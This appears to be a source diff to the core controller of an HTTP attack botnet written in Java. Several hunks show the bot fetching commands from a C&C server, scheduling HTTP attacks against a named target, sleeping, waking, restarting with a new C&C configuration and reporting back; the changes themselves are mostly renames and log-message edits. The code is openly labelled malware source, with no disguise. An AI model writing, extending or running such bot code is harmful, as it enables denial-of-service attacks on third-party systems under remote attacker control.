@@ -94,7 +94,7 @@ public class CoreController {
   private static List<Analyzer> ANALYZERS = new ArrayList<>();
 
   /**
-   * The current CC.
+   * The current controller.
    */
   private static Controller CONTROLLER;
 
@@ -138,7 +138,8 @@ public class CoreController {
           try {
             cmd = getNextCommand();
             executeCommand(cmd);
-            if (cmd.getScope().isSendReportAfter()) {
+            if (cmd.getScope().isWithReport() ||
+                (Boolean) cmd.getParams().getOrDefault("report", false)) {
               report();
             }
           } catch (BotCommandParsingException exc) {
@@ -158,8 +159,8 @@ public class CoreController {
 
           break;
 
-        case SLEEP:
-          LOGGER.trace("[SLEEP Branch]");
+        case ASLEEP:
+          LOGGER.trace("[ASLEEP Branch]");
           BotCommand cmdWhileSleeping = BotCommand.NONE;
           try {
             cmdWhileSleeping = getNextCommand();
@@ -264,7 +265,7 @@ public class CoreController {
   }
 
   /**
-   * Executes a command both in state {@code EXECUTION} and {@code SLEEP}.
+   * Executes a command both in state {@code EXECUTION} and {@code ASLEEP}.
    * @param cmd the command to execute.
    * @throws BotMalformedCommandException when command parameters are malformed.
    * @throws BotExecutionException when command cannot be correctly executed.
@@ -272,7 +273,7 @@ public class CoreController {
   private static void executeCommand(final BotCommand cmd)
       throws BotMalformedCommandException, BotExecutionException {
     LOGGER.traceEntry("cmd={}", cmd);
-    LOGGER.info("Executing command {} with params={}", cmd.getScope(), cmd.getParams());
+    LOGGER.info("Executing command {} with params {}", cmd.getScope(), cmd.getParams());
 
     switch (cmd.getScope()) {
 
@@ -394,8 +395,8 @@ public class CoreController {
         break;
 
       case WAKEUP:
-        if (!STATE.equals(BotState.SLEEP)) {
-          throw new BotExecutionException("Cannot execute command, because [STATE] is not [SLEEP]");
+        if (!STATE.equals(BotState.ASLEEP)) {
+          throw new BotExecutionException("Cannot execute command, because [STATE] is not [ASLEEP]");
         }
         final Interval wakeupDelay = (Interval) cmd.getParams().get("delay");
         if (wakeupDelay != null) {
@@ -419,7 +420,7 @@ public class CoreController {
    */
   private static void attackHttp(HttpAttack attack) throws BotExecutionException {
     LOGGER.traceEntry("attack={}", attack);
-    LOGGER.info("Scheduling attack...");
+    LOGGER.info("Scheduling attack against {}...", attack.getTarget());
     attack.getProperties().putIfAbsent("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());
     try {
       POOL.scheduleAttackHttp(attack);
@@ -494,7 +495,7 @@ public class CoreController {
     } catch (IOException exc) {
       throw new BotExecutionException("Cannot communicate with C&C at %s", logResource);
     }
-    LOGGER.info(AppLogMarkers.REPORT, "Report sent to CC at {}\n\t{}",
+    LOGGER.info(AppLogMarkers.REPORT, "Report sent to C&C at {}\n{}",
         CONTROLLER.getLogResource(), json);
   }
 
@@ -505,7 +506,7 @@ public class CoreController {
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
   private static void restartBot(String resource, boolean wait) throws BotExecutionException {
-    LOGGER.info("Restarting bot with CC at {}...", resource);
+    LOGGER.info("Restarting bot with C&C at {}...", resource);
     AppConfiguration newConfig;
     try {
       newConfig = AppConfigurationService.from(AppConfigurationFormat.JSON, resource);
@@ -535,7 +536,7 @@ public class CoreController {
   }
 
   /**
-   * Executes command {@code SLEEP}
+   * Executes command {@code ASLEEP}
    * @param timeout the time period to sleep.
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
@@ -547,7 +548,7 @@ public class CoreController {
 
     LOGGER.info("Falling asleep{}...",
         (timeout == null) ? "" : String.format(" (timeout: %s)", timeout));
-    changeState(BotState.SLEEP);
+    changeState(BotState.ASLEEP);
     try {
       POOL.pause();
     } catch (SchedulerException exc) {
@@ -632,7 +633,7 @@ public class CoreController {
     } catch (IOException exc) {
       throw new BotCommandParsingException("Cannot consume command. %s", exc.getMessage());
     }
-    LOGGER.info(AppLogMarkers.COMMAND, "Received command {} with params {} from CC at {}",
+    LOGGER.info(AppLogMarkers.COMMAND, "Received command {} with params {} from C&C at {}",
         cmd.getScope(), cmd.getParams(), CONTROLLER.getCmdResource());
     return cmd;
   }
